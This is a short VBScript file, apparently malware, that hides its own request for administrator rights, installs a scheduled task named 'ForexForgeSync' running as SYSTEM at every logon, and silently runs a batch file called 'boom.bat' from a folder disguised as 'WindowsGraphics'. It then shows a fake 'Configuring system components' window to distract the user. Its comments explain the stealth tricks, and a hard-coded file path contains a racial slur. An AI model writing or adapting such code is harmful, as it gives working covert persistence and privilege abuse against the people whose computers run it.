Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION CHECK ---
' Skips if running as /task (on reboot)
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Request Admin rights hidden (0)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: THE NO-UAC TASK CREATION ---
' This registers the task to run as SYSTEM, which never triggers a UAC prompt.
If WScript.Arguments.Named.Exists("elevate") Then
    strTaskName = "ForexForgeSync"
    
    ' Key fix: Added //B for silence and /ru "SYSTEM" to bypass user-level prompts.
    strRunCmd = "wscript.exe //B """ & strScript & """ /task"
    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"
    
    WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
    
    ' Run boom.bat hidden for initial setup
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If
End If

' --- STEP 3: THE "STICKY" DISTRACTION LOOP -------
' This runs on reboot (/task). If they close it, it re-opens until 30s is up.
startTime = Timer
Do While Timer < startTime + 30
    ' 1 = Visible, True = Script pauses and watches if the user closes the window.
    WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to avoid system errors. && timeout /t 30 /nobreak > nul", 1, True
    
    ' Re-launch if closed before the timer ends
    If Timer < startTime + 30 Then 
        WScript.Sleep 500 
    End If
Loop

WScript.Quit
